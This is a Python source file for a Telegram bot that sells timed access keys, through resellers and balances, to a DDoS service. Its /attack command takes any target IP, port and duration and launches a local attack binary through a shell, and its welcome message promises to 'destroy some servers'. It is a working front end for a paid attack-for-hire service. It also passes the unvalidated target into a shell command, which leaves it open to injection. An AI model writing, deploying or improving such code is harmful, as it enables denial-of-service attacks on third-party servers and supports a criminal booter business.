#!/usr/bin/python3

import requests
import subprocess
import telebot
import datetime
import os
import time
import secrets
from datetime import timedelta
from threading import Timer
import pytz
import stat

# Ensure SAM is executable
if os.path.exists("SAM"):
    os.chmod("SAM", stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

API_KEY = "YOUR_EXTERNAL_API_KEY"
ADMIN_IDS = {"7212246299"}

USER_FILE        = "users.txt"
LOG_FILE         = "log.txt"
USER_ACCESS_FILE = "users_access.txt"
KEYS_FILE        = "keys.txt"
RESELLERS_FILE   = "resellers.txt"
BALANCE_FILE     = "balances.txt"

ist = pytz.timezone('Asia/Kolkata')

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY PLANS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KEY_PLANS = {
    "12hr":  {"duration": timedelta(hours=12), "cost": 30},
    "1day":  {"duration": timedelta(days=1),   "cost": 60},
    "3day":  {"duration": timedelta(days=3),   "cost": 180},
    "7day":  {"duration": timedelta(days=7),   "cost": 300},
    "30day": {"duration": timedelta(days=30),  "cost": 1000},
    "60day": {"duration": timedelta(days=60),  "cost": 1900},
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FILE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def read_users() -> list:
    try:
        with open(USER_FILE, "r") as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

def save_users(users: list):
    with open(USER_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_user_access() -> dict:
    data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, expiry = line.split(":", 1)
                    data[uid] = {"expiry_time": float(expiry)}
    except FileNotFoundError:
        pass
    return data

def save_user_access(data: dict):
    with open(USER_ACCESS_FILE, "w") as f:
        for uid, info in data.items():
            f.write(f"{uid}:{info['expiry_time']}\n")

def read_keys() -> dict:
    keys = {}
    try:
        with open(KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 1)
                    keys[parts[0].strip()] = parts[1].strip()
    except FileNotFoundError:
        pass
    return keys

def save_keys(keys: dict):
    with open(KEYS_FILE, "w") as f:
        for key, plan in keys.items():
            f.write(f"{key}|{plan}\n")

def read_resellers() -> set:
    try:
        with open(RESELLERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_resellers(resellers: set):
    with open(RESELLERS_FILE, "w") as f:
        for uid in resellers:
            f.write(f"{uid}\n")

def read_balances() -> dict:
    balances = {}
    try:
        with open(BALANCE_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, bal = line.split(":", 1)
                    try:
                        balances[uid.strip()] = int(bal.strip())
                    except ValueError:
                        balances[uid.strip()] = 0
    except FileNotFoundError:
        pass
    return balances

def save_balances(balances: dict):
    with open(BALANCE_FILE, "w") as f:
        for uid, bal in balances.items():
            f.write(f"{uid}:{bal}\n")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  STATE & COOLDOWN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
allowed_user_ids: list = read_users()
user_access: dict      = read_user_access()
active_keys: dict      = read_keys()
RESELLER_IDS: set      = read_resellers()
balances: dict         = read_balances()
bgmi_cooldown = {} # Fixed: Now defined globally

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fmt_expiry(ts: float) -> str:
    return datetime.datetime.fromtimestamp(ts, tz=ist).strftime('%d %b %Y • %I:%M %p IST')

def generate_key() -> str:
    return "KEY-" + secrets.token_hex(10).upper()

def is_admin(uid: str) -> bool:
    return uid in ADMIN_IDS

def is_reseller(uid: str) -> bool:
    return uid in RESELLER_IDS

def is_admin_or_reseller(uid: str) -> bool:
    return is_admin(uid) or is_reseller(uid)

def get_balance(uid: str) -> int:
    return balances.get(uid, 0)

def log_action(user_id: str, action: str):
    try:
        info     = bot.get_chat(user_id)
        username = f"@{info.username}" if info.username else f"ID:{user_id}"
    except Exception:
        username = f"ID:{user_id}"
    now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{now}] {username} | {action}\n")

def clear_logs() -> str:
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        return "No logs to clear."
    open(LOG_FILE, "w").close()
    return "✅  Logs cleared."

def no_access_msg() -> str:
    return (
        "╔══════════════════════╗\n"
        "║   🚫  ACCESS DENIED   ║\n"
        "╚══════════════════════╝\n\n"
        "You don't have an active plan.\n"
        "Use /redeem <key> to activate access."
    )

def admin_only_msg() -> str:
    return "⛔  This command is restricted to admins only."

def admin_reseller_only_msg() -> str:
    return "⛔  This command is restricted to admins and resellers only."

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXPIRY MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def remove_expired_users():
    current_time = time.time()
    expired = [uid for uid, info in user_access.items()
               if info["expiry_time"] <= current_time]

    for uid in expired:
        try:
            bot.send_message(uid,
                "╔══════════════════════╗\n"
                "║   ⏰  PLAN EXPIRED    ║\n"
                "╚══════════════════════╝\n\n"
                "Your access plan has ended.\n\n"
                "🔑  Use /redeem <key> with a new key\n"
                "    to reactivate your access."
            )
        except Exception:
            pass
        user_access.pop(uid, None)
        if uid in allowed_user_ids:
            allowed_user_ids.remove(uid)

    if expired:
        save_users(allowed_user_ids)
        save_user_access(user_access)

    Timer(60, remove_expired_users).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HANDLERS — General
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = (
        "🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁</b> 🚀\n\n"
        "👑 <b>𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁</b>\n\n"
        "🎯 /attack [ip] [port] [time] - Start Attack\n"
        "📊 /status - Live Attack Status\n"
        "📦 /myplan - Check Your Plan\n"
        "❓ /help - Commands Menu\n\n"
        "🔥 <i>𝘓𝘦𝘵'𝘴 𝘥𝘦𝘴𝘵𝘳𝘰𝘺 𝘴𝘰𝘮𝘦 𝘴𝘦𝘳𝘃𝘦𝘳𝘴!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "      📋  COMMANDS\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  👤 USER COMMANDS\n"
        "  /start    → Welcome screen\n"
        "  /id       → Account info\n"
        "  /plan     → Plan expiry\n"
        "  /redeem   → Activate a key\n"
        "  /mylogs   → Your activity\n"
        "  /rules    → Usage rules\n"
        "  /status   → Bot status\n\n"
        "  🤝 RESELLER & ADMIN\n"
        "  /prices   → Key price list\n"
        "  /genkey   → Generate key\n"
        "  /listkeys → List unused keys\n"
        "  /deletekey→ Delete a key\n"
        "  /balance  → Check balance\n\n"
        "  🛠 ADMIN ONLY\n"
        "  /admincmd → View admin panel\n"
        "  /add      → Add user directly\n"
        "  /remove   → Remove a user\n"
        "  /allusers → List all users\n"
        "  /addreseller → Add a reseller\n"
        "  /rmreseller  → Remove reseller\n"
        "  /resellers   → List resellers\n"
        "  /addbalance  → Add funds\n"
        "  /setbalance  → Set funds\n"
        "  /broadcast   → Send msg to all\n"
        "  /logs         → Get log file\n"
        "  /clearlogs   → Clear log file\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

# ... [Keep your other handlers like /status, /prices, /id, /plan, /mylogs, /redeem, /genkey, /listkeys, etc. exactly as they were] ...

@bot.message_handler(commands=['status'])
def bot_status(message):
    now = datetime.datetime.now(ist).strftime('%d %b %Y • %I:%M %p')
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"      🟢  BOT STATUS\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Status   →  Online ✅\n"
        f"  Uptime   →  24 × 7\n"
        f"  Time     →  {now}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

# ... [Include all admin/reseller logic from your original code] ...

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ATTACK SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def record_command_logs(user_id, command, target=None, port=None, time_val=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time_val: log_entry += f" | Time: {time_val}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def log_command(user_id, target, port, time_val):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except:
        username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_val}\n\n")

def start_attack_reply(message, target, port, time_val):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 🚀 Attack Started Successfully! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time_val} seconds"
    bot.reply_to(message, response)

@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in ADMIN_IDS:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
                response = "You Are On Cooldown. Please Wait 1min Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return

        bgmi_cooldown[user_id] = datetime.datetime.now()
                
        command = message.text.split()
        if len(command) == 4:
           target = command[1]
           try:
               port = int(command[2])
               time_val = int(command[3])
           except ValueError:
               bot.reply_to(message, "❌ Error: Port and Time must be numbers.")
               return

           if time_val > 600 :
              response = "Error: Time interval must be less than 600."
           else:
                record_command_logs(user_id, '/attack', target, port, time_val)
                log_command(user_id, target, port, time_val)
                start_attack_reply(message, target, port, time_val)
                full_command = f"./SAM {target} {port} {time_val} 500"
                subprocess.run(full_command, shell=True)
                response = f" 🚀 Attack Finished! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time_val} seconds"
        else:
            response = "✅ Usage :- /attack <target> <port> <time>"
    else:
        response = no_access_msg()
        
    bot.reply_to(message, response)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    remove_expired_users()
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print("   ✅  Bot is running")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
